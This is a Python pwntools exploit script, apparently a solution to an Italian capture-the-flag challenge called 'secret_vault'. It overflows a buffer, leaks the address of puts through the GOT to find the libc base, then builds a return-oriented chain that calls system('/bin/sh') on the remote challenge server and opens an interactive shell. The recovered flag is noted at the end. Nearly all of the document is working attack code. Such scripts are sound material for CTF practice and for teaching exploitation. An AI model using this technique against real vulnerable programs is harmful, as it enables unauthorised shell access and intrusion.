from pwn import *

elf = ELF("secret_vault")
rop = ROP(elf.path)
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
offset = 0x58  # 88
r = remote("vault.challs.olicyber.it", 10006)


def choise(scelta):
    r.recvuntil(">")
    r.sendline(str(scelta))


with log.progress("leaking libc base address") as l:
    choise(1)
    payload = b'A' * offset
    payload += p64(rop.find_gadget(["pop rdi"])[0])
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.sym['main'])
    r.sendlineafter("Inserisci il tuo messaggio:\n", payload)
    choise(3)
    puts = u64(r.recv(6).ljust(8, b"\x00"))
    l.status("puts %s", hex(puts))
    libc_base = puts - libc.sym['puts']
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    l.success(hex(libc_base))

payload = b"A" * offset
payload += p64(rop.find_gadget(["pop rdi"])[0])
payload += p64(binsh)
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(system)
choise(1)
r.sendlineafter("Inserisci il tuo messaggio:\n", payload)

choise(3)
r.interactive()

# flag{pr3tty_3asy_1snt_1t?}
